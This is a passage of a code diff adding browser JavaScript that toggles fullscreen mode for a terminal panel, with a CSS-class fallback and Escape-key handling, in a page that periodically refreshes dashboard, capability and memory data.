+            } else if (termRoot?.requestFullscreen) {
+              if (document.fullscreenElement) await document.exitFullscreen();
+              await termRoot.requestFullscreen();
+            } else {
+              termRoot?.classList.toggle('term-fullscreen-fallback');
+              setTermFullscreenState(termRoot?.classList.contains('term-fullscreen-fallback'));
+            }
+          } catch {
+            termRoot?.classList.toggle('term-fullscreen-fallback');
+            setTermFullscreenState(termRoot?.classList.contains('term-fullscreen-fallback'));
+          }
+        });
+        document.addEventListener('fullscreenchange', () => {
+          if (!document.fullscreenElement) termRoot?.classList.remove('term-fullscreen-fallback');
+          setTermFullscreenState(document.fullscreenElement === termRoot || Boolean(termRoot?.classList.contains('term-fullscreen-fallback')));
+        });
+        document.addEventListener('keydown', (event) => {
+          if (event.key === 'Escape' && termRoot?.classList.contains('term-fullscreen-fallback')) {
+            termRoot.classList.remove('term-fullscreen-fallback');
+            setTermFullscreenState(false);
+          }
+        });
+
         setInterval(() => { loadHackDashboard(); loadCapabilities(); loadMemory(); }, 30000);
       })();
     </script>
